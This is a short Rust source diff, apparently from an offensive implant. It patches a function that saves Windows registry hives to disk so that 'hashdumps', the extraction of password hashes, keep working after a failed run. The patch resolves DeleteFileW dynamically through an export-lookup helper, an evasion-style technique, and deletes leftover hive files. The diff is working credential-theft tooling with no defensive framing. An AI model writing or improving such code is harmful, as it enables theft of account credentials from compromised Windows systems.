@@ -519,6 +519,14 @@ unsafe fn save_hive_fallback(chunk_name: &str) -> Result<String, i32> {
     }
     file_wide.push(0);
 
+    // Delete any stale temp file first — RegSaveKeyW refuses to overwrite an
+    // existing file (returns ERROR_ALREADY_EXISTS = 183). A failed prior run
+    // that left the .hive file would block all future hashdumps indefinitely.
+    type DeleteFileW = unsafe extern "system" fn(*const u16) -> i32;
+    if let Some(addr) = unsafe { export_addr(b"kernel32.dll", b"DeleteFileW") } {
+        let df: DeleteFileW = unsafe { core::mem::transmute(addr) };
+        let _ = unsafe { df(file_wide.as_ptr()) }; // ignore "not found" errors
+    }
     let rc = unsafe { save(hkey, file_wide.as_ptr(), core::ptr::null()) };
     let _ = close_key(hkey);
     if rc != 0 {
